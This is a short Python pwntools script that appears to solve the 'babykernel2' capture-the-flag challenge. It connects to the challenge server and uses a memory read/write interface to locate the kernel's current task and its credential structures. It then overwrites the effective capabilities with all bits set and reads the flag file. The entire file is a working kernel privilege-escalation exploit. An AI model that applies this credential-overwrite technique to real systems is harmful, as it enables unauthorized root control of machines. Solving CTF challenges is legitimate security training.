#!/usr/bin/env python2
from pwn import *
#context.log_level = 'debug'

#r = remote('localhost', 4000)
r = remote('babykernel2.forfuture.fluxfingers.net', 1337)

def readptr(addr):
    r.sendlineafter('> ', '1')
    r.sendlineafter('> ', hex(addr)[2:])
    r.recvuntil('is: ')
    return int(r.recvline(), 16)


def writeptr(addr, val):
    r.sendlineafter('> ', '2')
    r.sendlineafter('> ', hex(addr)[2:])
    r.sendlineafter('> ', hex(val)[2:])

def getflag():
    r.sendlineafter('> ', '4')
    r.sendlineafter('> ', '/flag')
    r.recvuntil('contents: \r\r\n')
    return r.recvuntil('}')

current_task_ptr = 0xffffffff8183a040

current_task = readptr(current_task_ptr)
print 'current_task:', hex(current_task)

cred_ptr = current_task + 0x400
real_cred_ptr = current_task + 0x3f8

cred = readptr(cred_ptr)
print 'cred:', hex(cred)

real_cred = readptr(real_cred_ptr)
print 'real_cred:', hex(real_cred)

# set all capabilities
cap_effective = cred + 0x38
writeptr(cap_effective, 0xffffffffffffffff)
print 'FLAG:', getflag()
